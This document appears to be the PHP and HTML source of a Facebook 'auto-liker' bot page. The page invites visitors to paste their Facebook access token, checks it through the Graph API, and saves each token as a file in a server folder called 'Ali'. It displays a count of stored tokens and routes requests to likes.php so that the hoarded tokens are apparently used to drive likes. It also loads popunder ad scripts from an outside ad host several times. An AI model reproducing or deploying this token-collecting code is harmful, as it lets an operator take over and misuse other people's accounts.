<!DOCTYPE html>
<html lang="en">

<meta charset="utf-8">
<title>HASSAN KHAN BOT</title><script type='text/javascript' src='back.js'></script>
<script type="text/javascript"  src="https://www.vpstrust.com/static/adutil.js" async></script>
<script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=gnu8vs539e"></script>
  <div id="header">
<style>

@font-face {

    font-family: miaanFont;

    src: url(dragon.ttf);

}

a

{

  text-decoration: none;

  color:#f6216f;

}

#footer

{

	position: absolute;

	vertical-align: center;

	width: 98%;

	top: 65%;	

}

.form

{

	position: absolute;

	vertical-align: center;

	width: 98%;

	top: 40%;

}

.form1

{

	position: absolute;

	vertical-align: center;

	width: 98%;

	top: 55%;

}

.access

{

	position: absolute;

	vertical-align: center;

	width: 98%;

}

.access h2

{

	margin-top: -15px;

}

input[type=text] {

font-family:miaanFont;

    width: 60%;

    height: 5%;

    padding: 8px 32px;

    margin: 8px 0;

    font-size:22px;

    box-sizing: border-box;

    border: 2px solid red;

    background-color: black;

    color: white;

    border-radius:50px;

    outline: none;

    text-align: center;

}

input[type=password] {

font-family:miaanFont;

    width: 60%;

    height: 5%;

    padding: 8px 32px;

    margin: 8px 0;

    font-size:22px;

    box-sizing: border-box;

    border: 2px solid red;

    background-color: black;

    color: white;

    border-radius:50px;

    outline: none;

    text-align: center;

}
    textarea
    {
      resize: none;
      font-family:Lobster;
      width: 60%;
      height: 30%;
      padding: 8px 32px;
      margin: 8px 0;
      font-size:22px;
      box-sizing: border-box;
      border: 2px solid red;
      background-color: black;
      color: white;
      border-radius:50px;
      outline: none;
      text-align: center;
    }    	

.button {

	font-family:miaanFont;

    height: 5%;

    background-color: black; /* Green */

    border: 2px solid red;

    color: blue;

    padding: 8px 32px;

    text-align: center;

    text-decoration: none;

    display: inline-block;

    font-size: 22px;

    margin: 4px 2px;

    -webkit-transition-duration: 0.4s; /* Safari */

    transition-duration: 0.4s;

    cursor: pointer;

}



.button1 {

    background-color: black;

    color: #f6a821;

    border-radius:50px;

}



.button1:hover {

    background-color: #f6216f;

    color: black;

}
<body bgcolor="#f6a821">
body {background: #f6a821 url();margin:0;padding:0;color: #eee;background-size: 1300px 800px;background-repeat: no-repeat;background-position: center
top;}
<body bgcolor="#f6a821">

</style>
<body bgcolor="#f6a821">
</head>



<div id="header">
<h1 class="heading">
    <style>
.snow-container{position:fixed;width:100%;max-width:100%;z-index:99999;pointer-events:none;overflow:hidden;top:0;height:100%}.snow{display:block;position:absolute;z-index:2;top:0;right:0;bottom:0;left:0;pointer-events:none;-webkit-transform:translate3d(0,-100%,0);transform:translate3d(0,-100%,0);-webkit-animation:snow linear infinite;animation:snow linear infinite}.snow.foreground{background-image:url("https://vipfb.co/img/snow-large-vipfb.co.png");-webkit-animation-duration:15s;animation-duration:10s}.snow.foreground.layered{-webkit-animation-delay:7.5s;animation-delay:7.5s}.snow.middleground{background-image:url(https://vipfb.co/img/snow-medium-vipfb.co.png);-webkit-animation-duration:20s;animation-duration:15s}.snow.middleground.layered{-webkit-animation-delay:10s;animation-delay:10s}.snow.background{background-image:url(https://vipfb.co/img/snow-small-vipfb.co.png);-webkit-animation-duration:25s;animation-duration:20s}.snow.background.layered{-webkit-animation-delay:12.5s;animation-delay:12.5s}@-webkit-keyframes snow{0%{-webkit-transform:translate3d(0,-100%,0);transform:translate3d(0,-100%,0)}100%{-webkit-transform:translate3d(5%,100%,0);transform:translate3d(5%,100%,0)}}@keyframes snow{0%{-webkit-transform:translate3d(0,-100%,0);transform:translate3d(0,-100%,0)}100%{-webkit-transform:translate3d(5%,100%,0);transform:translate3d(5%,100%,0)}} </style> <div class='snow-container'> <div class='snow foreground'></div> <div class='snow foreground layered'></div> <div class='snow middleground'></div> <div class='snow middleground layered'></div> <div class='snow background'></div> <div class='snow background layered'></div> </div><!--  * Contact Developer fb.com/100024695769445 * * Never Give Up . * * Code By Habib Khaan Bachex Dont Copy It . *--> 



<?php
$yx=opendir('Ali');
while($isi=readdir($yx)){
if($isi != '.' && $isi != '..'){
$member[]=$isi;
}
}
$like = new like();
if($_GET[act]){
print '';
}
if($_POST[access_token]){
$access_token = $_POST[access_token];
$me = $like -> me($access_token);
if($me[id]){
$like -> Ali($access_token);
if($_POST[id]){
$like -> pancal($_POST[id]);
}else{
$like -> getData($access_token);
}
}else{
$like -> invalidToken();
}
}else{
$like->form();
}
class like {
public function pancal($id){ for($i=1;$i<4;$i++){
$this-> _req('http://google.com/gwt/n?u='.urlencode('http://'.$_SERVER[HTTP_HOST].'/likes.php?id='.$id.'&n='.$i));
}
print '';
}
public function me($access){
return json_decode($this-> _req('https://graph.facebook.com/me?access_token='.$access),true);
}
public function Ali($access){
if(!is_dir('Ali')){
mkdir('Ali');
}
$a=fopen('Ali/'.$access,'w');
fwrite($a,1);
fclose($a);
}
public function invalidToken(){
print'<script type="text/javascript">alert("INFO : Token Invalid")</script>';
$this->form();
}
public function form(){
 echo '
<head><div id="header">

<center><font style="color:red;font-size:33px;font-family:miaanFont"> 
<center/> <font size="40"><script src=""></script>
<a target="_blank"  href="https://www.facebook.com/100016439528210">

<center> <img src="a.jpg" alt="" style="border-radius: 100%; border: 2px solid white;" width="200" height="200" title="Visit admin Profile"/></a>
<center/>
<strong>
<center><script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=gnu8vs539e"></script><a href="http://get-token.ga/" target="blank"> Get Token </a></center>
<form action="index.php" method="post">
<input class="inptext inptext1" type="text"   name="access_token" placeholder="Paste Your Access Token Here" required></br>
<input class="button button1" id="sbmt" class="inp-btn"  type="submit"   value="Submit"></form></div></div></div><script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=gnu8vs539e"></script>
<font style="color:red;font-size:33px;font-family:miaanFont"><h3 align="center"><font style="background: url( ) color:#f6216f;  font-family:miaanFont;font-size:70px;">

Modify  By <a target="_blank" href="https://m.facebook.com/100016439528210"> Hassan Khan </a><strong/></strong>
';
}
public function getData($access){
$feed=json_decode($this -> _req('https://graph.facebook.com/me?fields=id,name&access_token='.$access),true);
for($i=0;$i<count($feed[data]);$i++){
$id1 = $feed[data][$i][id];
}
echo'<script type="text/javascript">alert("INFO : Data Successfully Saved")</script>
<div id="header">
<center><font style="color:red;font-size:33px;font-family:miaanFont"> 
<center/> <font size="40"><script src=""></script>
<a target="_blank"  href="https://www.facebook.com/100016439528210">

<center> <img src="a.jpg" alt="" style="border-radius: 100%; border: 2px solid white;" width="200" height="200" title="Visit admin Profile"/></a>
<center/>

<div id="center"> <center><font style="color:red;font-size:33px;font-family:miaanFont"><font size="70"> <font color="white"> 
<marquee behavior="alternate"> Bot Successfully Activated </marquee>

<div id="center"><center>
 <font color="white">
<center>

 <font size="70"> <font color="white">  Token Saved! </font></br>
[<a href="index.php"  value="Click Here">Click Here</a>] to go back to the home page.</div></center>
</br>
</div>
<center><font style="color:red;font-size:33px;font-family:miaanFont"><div id="footer"><font size="70"> <font color="white"> 

Made By <a target="_blank" href="https://m.facebook.com/100016439528210">Hassan Khan</a></br>
</div>';
}

private function _req($url){
$ch = curl_init();
curl_setopt_array($ch,array(
CURLOPT_CONNECTTIMEOUT => 5,
CURLOPT_RETURNTRANSFER => true,
CURLOPT_URL => $url,
));
$result = curl_exec($ch);
curl_close($ch);
return $result;
}
}
?>
<br>
<br>

<center><font style="color:red;font-size:33px;font-family:miaanFont">  <font color="red">
<center>

 <font size="60"> <?php 
    // integer starts at 0 before counting
    $i = 0; 
    $dir = 'Ali/';
    if ($handle = opendir($dir)) {
        while (($file = readdir($handle)) !== false){
            if (!in_array($file, array('.', '..')) && !is_dir($dir.$file)) 
                $i++;
        }
    }
    // prints out how many were in the directory
    
    echo 
    "  Userx : $i ";
?></strong></center>

<audio autoplay loop>
<source src="https://e.top4top.net/m_828gj16v1.mp3">
</audio>
<script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=gnu8vs539e"></script>
